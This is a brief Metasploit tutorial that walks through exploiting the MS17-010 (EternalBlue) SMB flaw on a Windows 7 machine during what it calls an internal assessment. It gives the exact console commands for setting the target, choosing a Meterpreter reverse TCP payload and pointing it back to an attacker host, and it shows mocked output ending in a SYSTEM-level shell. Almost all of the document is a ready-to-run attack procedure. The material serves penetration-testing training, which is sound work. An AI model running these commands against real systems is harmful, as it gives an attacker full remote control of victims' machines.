# Metasploit Framework Examples

## Scenario: Exploiting an Unpatched Windows SMB Service

During an internal assessment, you discovered a Windows 7 machine vulnerable to MS17-010 (EternalBlue). You want to use Metasploit to gain a reverse shell.

### Execution Steps

Launch the Metasploit console by typing `msfconsole`.

### Commands

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Explanation of Variables
* `RHOSTS`: The target IP address (Remote Host).
* `PAYLOAD`: The payload to execute upon successful exploitation (Meterpreter reverse TCP shell).
* `LHOST`: Your attacking machine's IP address (Local Host) where the payload will connect back to.

### Mocked Terminal Output

```text
[*] Started reverse TCP handler on 192.168.1.100:4444 
[*] 192.168.1.50:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.50:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.50:445 - Connecting to target for exploitation.
[+] 192.168.1.50:445 - Connection established for exploitation.
[*] 192.168.1.50:445 - Core raw buffer dump (42 bytes)
[*] 192.168.1.50:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 192.168.1.50:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.50:445 - Starting non-paged pool grooming
[+] 192.168.1.50:445 - Sending stage (200774 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.50:49158) at 2024-05-31 10:30:00 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
